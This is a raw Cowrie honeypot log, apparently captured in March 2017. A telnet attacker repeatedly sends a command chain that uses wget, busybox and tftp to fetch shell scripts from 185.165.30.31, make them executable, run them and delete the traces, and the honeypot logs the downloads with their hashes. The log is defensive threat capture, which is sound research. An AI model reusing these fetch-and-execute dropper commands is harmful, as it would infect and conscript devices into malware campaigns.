+2017-03-05T16:45:36+0000 [HTTPPageDownloader,client] Not storing duplicate content 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:45:36+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.165.30.31/bins2.sh) with SHA-256 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84 to dl/88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:45:36+0000 [HTTPPageDownloader,client] Command found: chmod +x /tmp/bins2.sh
+2017-03-05T16:45:36+0000 [HTTPPageDownloader,client] Command found: sh /tmp/bins2.sh
+2017-03-05T16:45:36+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:36+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:36+0000 [HTTPPageDownloader,client] Command found: busybox tftp 185.165.30.31 -c get tftp1.sh
+2017-03-05T16:45:36+0000 [HTTPPageDownloader,client] Command found: tftp 185.165.30.31 -c get tftp1.sh
+2017-03-05T16:45:36+0000 [HTTPPageDownloader,client] Command found: chmod +x tftp1.sh
+2017-03-05T16:45:36+0000 [HTTPPageDownloader,client] Command found: sh tftp1.sh
+2017-03-05T16:45:36+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:36+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:36+0000 [HTTPPageDownloader,client] Command found: busybox tftp -r tftp2.sh -g 185.165.30.31
+2017-03-05T16:45:36+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 185.165.30.31
+2017-03-05T16:45:36+0000 [HTTPPageDownloader,client] Command found: chmod +x tftp2.sh
+2017-03-05T16:45:36+0000 [HTTPPageDownloader,client] Command found: sh tftp2.sh
+2017-03-05T16:45:36+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:36+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:36+0000 [HTTPPageDownloader,client] Command found: rm -rf /tmp/bins.sh /tmp/bins2.sh
+2017-03-05T16:45:36+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.165.30.31/bins2.sh>
+2017-03-05T16:45:40+0000 [CowrieTelnetTransport,41687,188.16.72.14] CMD: (cd /var/run || cd /tmp; rm -rf *.sh); (cd /var/run || cd /tmp; wget http://185.165.30.31/bins.sh; chmod +x bins.sh; sh bins.sh) || (cd /var/run || cd /tmp; busybox wget http://185.165.30.31/bins2.sh; chmod +x bins2.sh; sh bins2.sh) || (cd /var/run || cd /tmp; busybox tftp 185.165.30.31 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh) || (cd /var/run || cd /tmp; busybox tftp -r tftp2.sh -g 185.165.30.31; chmod +x tftp2.sh; sh tftp2.sh); (cd /var/run || cd /tmp; rm -rf *.sh);
+2017-03-05T16:45:40+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /var/run
+2017-03-05T16:45:40+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /tmp
+2017-03-05T16:45:40+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: rm -rf *.sh
+2017-03-05T16:45:40+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /var/run
+2017-03-05T16:45:40+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /tmp
+2017-03-05T16:45:40+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: wget http://185.165.30.31/bins.sh
+2017-03-05T16:45:40+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.165.30.31/bins.sh>
+2017-03-05T16:45:40+0000 [HTTPPageDownloader,client] Not storing duplicate content 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:45:40+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.165.30.31/bins.sh) with SHA-256 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2 to dl/8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:45:40+0000 [HTTPPageDownloader,client] Command found: chmod +x /tmp/bins.sh
+2017-03-05T16:45:40+0000 [HTTPPageDownloader,client] Command found: sh /tmp/bins.sh
+2017-03-05T16:45:40+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:40+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:40+0000 [HTTPPageDownloader,client] Command found: busybox wget http://185.165.30.31/bins2.sh
+2017-03-05T16:45:40+0000 [HTTPPageDownloader,client] Command found: wget http://185.165.30.31/bins2.sh
+2017-03-05T16:45:40+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.165.30.31/bins2.sh>
+2017-03-05T16:45:40+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.165.30.31/bins.sh>
+2017-03-05T16:45:40+0000 [HTTPPageDownloader,client] Not storing duplicate content 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:45:40+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.165.30.31/bins2.sh) with SHA-256 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84 to dl/88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:45:40+0000 [HTTPPageDownloader,client] Command found: chmod +x /tmp/bins2.sh
+2017-03-05T16:45:40+0000 [HTTPPageDownloader,client] Command found: sh /tmp/bins2.sh
+2017-03-05T16:45:40+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:40+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:40+0000 [HTTPPageDownloader,client] Command found: busybox tftp 185.165.30.31 -c get tftp1.sh
+2017-03-05T16:45:40+0000 [HTTPPageDownloader,client] Command found: tftp 185.165.30.31 -c get tftp1.sh
+2017-03-05T16:45:40+0000 [HTTPPageDownloader,client] Command found: chmod +x tftp1.sh
+2017-03-05T16:45:40+0000 [HTTPPageDownloader,client] Command found: sh tftp1.sh
+2017-03-05T16:45:40+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:40+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:40+0000 [HTTPPageDownloader,client] Command found: busybox tftp -r tftp2.sh -g 185.165.30.31
+2017-03-05T16:45:40+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 185.165.30.31
+2017-03-05T16:45:40+0000 [HTTPPageDownloader,client] Command found: chmod +x tftp2.sh
+2017-03-05T16:45:40+0000 [HTTPPageDownloader,client] Command found: sh tftp2.sh
+2017-03-05T16:45:40+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:40+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:40+0000 [HTTPPageDownloader,client] Command found: rm -rf /tmp/bins.sh /tmp/bins2.sh
+2017-03-05T16:45:40+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.165.30.31/bins2.sh>
+2017-03-05T16:45:43+0000 [CowrieTelnetTransport,41687,188.16.72.14] CMD: (cd /var/run || cd /tmp; rm -rf *.sh); (cd /var/run || cd /tmp; wget http://185.165.30.31/bins.sh; chmod +x bins.sh; sh bins.sh) || (cd /var/run || cd /tmp; busybox wget http://185.165.30.31/bins2.sh; chmod +x bins2.sh; sh bins2.sh) || (cd /var/run || cd /tmp; busybox tftp 185.165.30.31 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh) || (cd /var/run || cd /tmp; busybox tftp -r tftp2.sh -g 185.165.30.31; chmod +x tftp2.sh; sh tftp2.sh); (cd /var/run || cd /tmp; rm -rf *.sh);
+2017-03-05T16:45:43+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /var/run
+2017-03-05T16:45:43+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /tmp
+2017-03-05T16:45:43+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: rm -rf *.sh
+2017-03-05T16:45:43+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /var/run
+2017-03-05T16:45:43+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /tmp
+2017-03-05T16:45:43+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: wget http://185.165.30.31/bins.sh
+2017-03-05T16:45:43+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.165.30.31/bins.sh>
+2017-03-05T16:45:43+0000 [HTTPPageDownloader,client] Not storing duplicate content 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:45:43+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.165.30.31/bins.sh) with SHA-256 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2 to dl/8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:45:43+0000 [HTTPPageDownloader,client] Command found: chmod +x /tmp/bins.sh
+2017-03-05T16:45:43+0000 [HTTPPageDownloader,client] Command found: sh /tmp/bins.sh
+2017-03-05T16:45:43+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:43+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:43+0000 [HTTPPageDownloader,client] Command found: busybox wget http://185.165.30.31/bins2.sh
+2017-03-05T16:45:43+0000 [HTTPPageDownloader,client] Command found: wget http://185.165.30.31/bins2.sh
+2017-03-05T16:45:43+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.165.30.31/bins2.sh>
+2017-03-05T16:45:43+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.165.30.31/bins.sh>
+2017-03-05T16:45:43+0000 [HTTPPageDownloader,client] Not storing duplicate content 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:45:43+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.165.30.31/bins2.sh) with SHA-256 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84 to dl/88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:45:43+0000 [HTTPPageDownloader,client] Command found: chmod +x /tmp/bins2.sh
+2017-03-05T16:45:43+0000 [HTTPPageDownloader,client] Command found: sh /tmp/bins2.sh
+2017-03-05T16:45:43+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:43+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:43+0000 [HTTPPageDownloader,client] Command found: busybox tftp 185.165.30.31 -c get tftp1.sh
+2017-03-05T16:45:43+0000 [HTTPPageDownloader,client] Command found: tftp 185.165.30.31 -c get tftp1.sh
+2017-03-05T16:45:43+0000 [HTTPPageDownloader,client] Command found: chmod +x tftp1.sh
+2017-03-05T16:45:43+0000 [HTTPPageDownloader,client] Command found: sh tftp1.sh
+2017-03-05T16:45:43+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:43+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:43+0000 [HTTPPageDownloader,client] Command found: busybox tftp -r tftp2.sh -g 185.165.30.31
+2017-03-05T16:45:43+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 185.165.30.31
+2017-03-05T16:45:43+0000 [HTTPPageDownloader,client] Command found: chmod +x tftp2.sh
+2017-03-05T16:45:43+0000 [HTTPPageDownloader,client] Command found: sh tftp2.sh
+2017-03-05T16:45:43+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:43+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:43+0000 [HTTPPageDownloader,client] Command found: rm -rf /tmp/bins.sh /tmp/bins2.sh
+2017-03-05T16:45:43+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.165.30.31/bins2.sh>
+2017-03-05T16:45:47+0000 [CowrieTelnetTransport,41687,188.16.72.14] CMD: (cd /var/run || cd /tmp; rm -rf *.sh); (cd /var/run || cd /tmp; wget http://185.165.30.31/bins.sh; chmod +x bins.sh; sh bins.sh) || (cd /var/run || cd /tmp; busybox wget http://185.165.30.31/bins2.sh; chmod +x bins2.sh; sh bins2.sh) || (cd /var/run || cd /tmp; busybox tftp 185.165.30.31 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh) || (cd /var/run || cd /tmp; busybox tftp -r tftp2.sh -g 185.165.30.31; chmod +x tftp2.sh; sh tftp2.sh); (cd /var/run || cd /tmp; rm -rf *.sh);
+2017-03-05T16:45:47+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /var/run
+2017-03-05T16:45:47+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /tmp
+2017-03-05T16:45:47+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: rm -rf *.sh
+2017-03-05T16:45:47+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /var/run
+2017-03-05T16:45:47+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /tmp
+2017-03-05T16:45:47+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: wget http://185.165.30.31/bins.sh
+2017-03-05T16:45:47+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.165.30.31/bins.sh>
+2017-03-05T16:45:47+0000 [HTTPPageDownloader,client] Not storing duplicate content 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:45:47+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.165.30.31/bins.sh) with SHA-256 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2 to dl/8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:45:47+0000 [HTTPPageDownloader,client] Command found: chmod +x /tmp/bins.sh
+2017-03-05T16:45:47+0000 [HTTPPageDownloader,client] Command found: sh /tmp/bins.sh
+2017-03-05T16:45:47+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:47+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:47+0000 [HTTPPageDownloader,client] Command found: busybox wget http://185.165.30.31/bins2.sh
+2017-03-05T16:45:47+0000 [HTTPPageDownloader,client] Command found: wget http://185.165.30.31/bins2.sh
+2017-03-05T16:45:47+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.165.30.31/bins2.sh>
+2017-03-05T16:45:47+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.165.30.31/bins.sh>
+2017-03-05T16:45:47+0000 [HTTPPageDownloader,client] Not storing duplicate content 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:45:47+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.165.30.31/bins2.sh) with SHA-256 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84 to dl/88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:45:47+0000 [HTTPPageDownloader,client] Command found: chmod +x /tmp/bins2.sh
+2017-03-05T16:45:47+0000 [HTTPPageDownloader,client] Command found: sh /tmp/bins2.sh
+2017-03-05T16:45:47+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:47+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:47+0000 [HTTPPageDownloader,client] Command found: busybox tftp 185.165.30.31 -c get tftp1.sh
+2017-03-05T16:45:47+0000 [HTTPPageDownloader,client] Command found: tftp 185.165.30.31 -c get tftp1.sh
+2017-03-05T16:45:47+0000 [HTTPPageDownloader,client] Command found: chmod +x tftp1.sh
+2017-03-05T16:45:47+0000 [HTTPPageDownloader,client] Command found: sh tftp1.sh
+2017-03-05T16:45:47+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:47+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:47+0000 [HTTPPageDownloader,client] Command found: busybox tftp -r tftp2.sh -g 185.165.30.31
+2017-03-05T16:45:47+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 185.165.30.31
+2017-03-05T16:45:47+0000 [HTTPPageDownloader,client] Command found: chmod +x tftp2.sh
+2017-03-05T16:45:47+0000 [HTTPPageDownloader,client] Command found: sh tftp2.sh
+2017-03-05T16:45:47+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:47+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:47+0000 [HTTPPageDownloader,client] Command found: rm -rf /tmp/bins.sh /tmp/bins2.sh
+2017-03-05T16:45:47+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.165.30.31/bins2.sh>
+2017-03-05T16:45:50+0000 [CowrieTelnetTransport,41687,188.16.72.14] CMD: (cd /var/run || cd /tmp; rm -rf *.sh); (cd /var/run || cd /tmp; wget http://185.165.30.31/bins.sh; chmod +x bins.sh; sh bins.sh) || (cd /var/run || cd /tmp; busybox wget http://185.165.30.31/bins2.sh; chmod +x bins2.sh; sh bins2.sh) || (cd /var/run || cd /tmp; busybox tftp 185.165.30.31 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh) || (cd /var/run || cd /tmp; busybox tftp -r tftp2.sh -g 185.165.30.31; chmod +x tftp2.sh; sh tftp2.sh); (cd /var/run || cd /tmp; rm -rf *.sh);
+2017-03-05T16:45:50+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /var/run
+2017-03-05T16:45:50+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /tmp
+2017-03-05T16:45:50+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: rm -rf *.sh
+2017-03-05T16:45:50+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /var/run
+2017-03-05T16:45:50+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /tmp
+2017-03-05T16:45:50+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: wget http://185.165.30.31/bins.sh
+2017-03-05T16:45:50+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.165.30.31/bins.sh>
+2017-03-05T16:45:50+0000 [HTTPPageDownloader,client] Not storing duplicate content 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:45:50+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.165.30.31/bins.sh) with SHA-256 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2 to dl/8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:45:50+0000 [HTTPPageDownloader,client] Command found: chmod +x /tmp/bins.sh
+2017-03-05T16:45:50+0000 [HTTPPageDownloader,client] Command found: sh /tmp/bins.sh
+2017-03-05T16:45:50+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:50+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:50+0000 [HTTPPageDownloader,client] Command found: busybox wget http://185.165.30.31/bins2.sh
+2017-03-05T16:45:50+0000 [HTTPPageDownloader,client] Command found: wget http://185.165.30.31/bins2.sh
+2017-03-05T16:45:50+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.165.30.31/bins2.sh>
+2017-03-05T16:45:50+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.165.30.31/bins.sh>
+2017-03-05T16:45:50+0000 [HTTPPageDownloader,client] Not storing duplicate content 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:45:50+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.165.30.31/bins2.sh) with SHA-256 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84 to dl/88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:45:50+0000 [HTTPPageDownloader,client] Command found: chmod +x /tmp/bins2.sh
+2017-03-05T16:45:50+0000 [HTTPPageDownloader,client] Command found: sh /tmp/bins2.sh
+2017-03-05T16:45:50+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:50+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:50+0000 [HTTPPageDownloader,client] Command found: busybox tftp 185.165.30.31 -c get tftp1.sh
+2017-03-05T16:45:50+0000 [HTTPPageDownloader,client] Command found: tftp 185.165.30.31 -c get tftp1.sh
+2017-03-05T16:45:50+0000 [HTTPPageDownloader,client] Command found: chmod +x tftp1.sh
+2017-03-05T16:45:50+0000 [HTTPPageDownloader,client] Command found: sh tftp1.sh
+2017-03-05T16:45:50+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:50+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:50+0000 [HTTPPageDownloader,client] Command found: busybox tftp -r tftp2.sh -g 185.165.30.31
+2017-03-05T16:45:50+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 185.165.30.31
+2017-03-05T16:45:50+0000 [HTTPPageDownloader,client] Command found: chmod +x tftp2.sh
+2017-03-05T16:45:50+0000 [HTTPPageDownloader,client] Command found: sh tftp2.sh
+2017-03-05T16:45:50+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:50+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:50+0000 [HTTPPageDownloader,client] Command found: rm -rf /tmp/bins.sh /tmp/bins2.sh
+2017-03-05T16:45:50+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.165.30.31/bins2.sh>
+2017-03-05T16:45:54+0000 [CowrieTelnetTransport,41687,188.16.72.14] CMD: (cd /var/run || cd /tmp; rm -rf *.sh); (cd /var/run || cd /tmp; wget http://185.165.30.31/bins.sh; chmod +x bins.sh; sh bins.sh) || (cd /var/run || cd /tmp; busybox wget http://185.165.30.31/bins2.sh; chmod +x bins2.sh; sh bins2.sh) || (cd /var/run || cd /tmp; busybox tftp 185.165.30.31 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh) || (cd /var/run || cd /tmp; busybox tftp -r tftp2.sh -g 185.165.30.31; chmod +x tftp2.sh; sh tftp2.sh); (cd /var/run || cd /tmp; rm -rf *.sh);
+2017-03-05T16:45:54+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /var/run
+2017-03-05T16:45:54+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /tmp
+2017-03-05T16:45:54+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: rm -rf *.sh
+2017-03-05T16:45:54+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /var/run
+2017-03-05T16:45:54+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /tmp
+2017-03-05T16:45:54+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: wget http://185.165.30.31/bins.sh
+2017-03-05T16:45:54+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.165.30.31/bins.sh>
+2017-03-05T16:45:54+0000 [HTTPPageDownloader,client] Not storing duplicate content 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:45:54+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.165.30.31/bins.sh) with SHA-256 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2 to dl/8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:45:54+0000 [HTTPPageDownloader,client] Command found: chmod +x /tmp/bins.sh
+2017-03-05T16:45:54+0000 [HTTPPageDownloader,client] Command found: sh /tmp/bins.sh
+2017-03-05T16:45:54+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:54+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:54+0000 [HTTPPageDownloader,client] Command found: busybox wget http://185.165.30.31/bins2.sh
+2017-03-05T16:45:54+0000 [HTTPPageDownloader,client] Command found: wget http://185.165.30.31/bins2.sh
+2017-03-05T16:45:54+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.165.30.31/bins2.sh>
+2017-03-05T16:45:54+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.165.30.31/bins.sh>
+2017-03-05T16:45:54+0000 [HTTPPageDownloader,client] Not storing duplicate content 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:45:54+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.165.30.31/bins2.sh) with SHA-256 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84 to dl/88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:45:54+0000 [HTTPPageDownloader,client] Command found: chmod +x /tmp/bins2.sh
+2017-03-05T16:45:54+0000 [HTTPPageDownloader,client] Command found: sh /tmp/bins2.sh
+2017-03-05T16:45:54+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:54+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:54+0000 [HTTPPageDownloader,client] Command found: busybox tftp 185.165.30.31 -c get tftp1.sh
+2017-03-05T16:45:54+0000 [HTTPPageDownloader,client] Command found: tftp 185.165.30.31 -c get tftp1.sh
+2017-03-05T16:45:54+0000 [HTTPPageDownloader,client] Command found: chmod +x tftp1.sh
+2017-03-05T16:45:54+0000 [HTTPPageDownloader,client] Command found: sh tftp1.sh
+2017-03-05T16:45:54+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:54+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:54+0000 [HTTPPageDownloader,client] Command found: busybox tftp -r tftp2.sh -g 185.165.30.31
+2017-03-05T16:45:54+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 185.165.30.31
+2017-03-05T16:45:54+0000 [HTTPPageDownloader,client] Command found: chmod +x tftp2.sh
+2017-03-05T16:45:54+0000 [HTTPPageDownloader,client] Command found: sh tftp2.sh
+2017-03-05T16:45:54+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:45:54+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:45:54+0000 [HTTPPageDownloader,client] Command found: rm -rf /tmp/bins.sh /tmp/bins2.sh
+2017-03-05T16:45:54+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.165.30.31/bins2.sh>
+2017-03-05T16:45:54+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 67.229.141.98:33142 (10.8.41.81:2223) [session: TT41688]
+2017-03-05T16:45:56+0000 [HoneyPotSSHTransport,8896,116.31.116.51] NEW KEYS
+2017-03-05T16:45:56+0000 [HoneyPotSSHTransport,8896,116.31.116.51] starting service 'ssh-userauth'
+2017-03-05T16:45:57+0000 [CowrieTelnetTransport,41687,188.16.72.14] CMD: (cd /var/run || cd /tmp; rm -rf *.sh); (cd /var/run || cd /tmp; wget http://185.165.30.31/bins.sh; chmod +x bins.sh; sh bins.sh) || (cd /var/run || cd /tmp; busybox wget http://185.165.30.31/bins2.sh; chmod +x bins2.sh; sh bins2.sh) || (cd /var/run || cd /tmp; busybox tftp 185.165.30.31 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh) || (cd /var/run || cd /tmp; busybox tftp -r tftp2.sh -g 185.165.30.31; chmod +x tftp2.sh; sh tftp2.sh); (cd /var/run || cd /tmp; rm -rf *.sh);
+2017-03-05T16:45:57+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /var/run
+2017-03-05T16:45:57+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /tmp
+2017-03-05T16:45:57+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: rm -rf *.sh
+2017-03-05T16:45:57+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /var/run
+2017-03-05T16:45:57+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /tmp
+2017-03-05T16:45:57+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: wget http://185.165.30.31/bins.sh
+2017-03-05T16:45:57+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.165.30.31/bins.sh>
